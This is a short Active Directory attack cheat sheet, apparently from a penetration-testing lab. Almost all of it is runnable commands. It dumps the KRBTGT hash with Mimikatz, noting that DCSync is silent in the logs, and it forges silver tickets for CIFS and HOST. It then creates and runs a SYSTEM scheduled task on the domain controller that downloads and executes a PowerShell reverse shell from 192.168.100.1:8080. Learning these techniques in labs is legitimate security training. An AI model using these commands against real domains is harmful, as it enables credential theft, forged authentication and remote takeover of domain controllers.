## Execute mimikatz on DC as Domain Admin to get KRBTGT hash
to dump all hashes, take note of the domain admin hash (KRBTGT)
```powershell
Invoke-Mimikatz -Command '"lsadump:lsa /patch"' -Computername corp-dc
```

## Alternatively, use DCSync
Silent in the logs

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

# Silver Ticket
```powershell
Invoke-Mimikatz -Command '"kerberos::golden
/domain:dollarcorp.moneycorp.local /sid:S-1-5-21-
1874506631-3219952063-538504511 /target:dcorp-
dc.dollarcorp.moneycorp.local /service:CIFS
/rc4:6f5b5acaf7433b3282ac22e21e62ff22
/user:Administrator /ptt"'
```


## Command breakdown

| Invoke-Mimikatz -Command |	 |
| ---	| --- |
| kerberos::golden | Name of the module |
| /domain:dollarcorp.moneycorp.local | Domain FQDN |
| /sid:S-1-5-21-1874506631-3219952063-538504511| SID of the domain |
| /target:dcorp-dc.dollarcorp.moneycorp.local| Target server FQDN |
| /service:cifs | The SPN name of the service which TGS is to be created |
| /rc4:6f5b5acaf7433b3282ac22e21e62ff22 | NTLM (RC4) hash of the service account. Use /aes128 and /aes256 for using AES keys|
| /id:500 /groups:512 | optional User RID (default 500) and group default 513 512 520 518 519 |
| /ppt or /ticket | (ppt) Injects ticket in current powershell process - no need to save the ticket on disk. (ticket) Saves the ticket to a file for later use |


## show if ticket is created
```powershell
klist
```

# Schedule and execute a task (HOST)
Create a silver ticket for the HOST SPN which will allow us to schedule a
task on the target:
```powershell
Invoke-Mimikatz -Command '"kerberos::golden
/domain:dollarcorp.moneycorp.local /sid:S-1-5-21-
1874506631-3219952063-538504511 /target:dcorp-
dc.dollarcorp.moneycorp.local /service:HOST
/rc4:6f5b5acaf7433b3282ac22e21e62ff22
/user:Administrator /ptt"'
```

## Schedule
```powershell
schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local
/SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR
"powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.100.1:808
0/Invoke-PowerShellTcp.ps1''')'"
```

## Execute a task
```powershell
schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN
"STCheck"
```
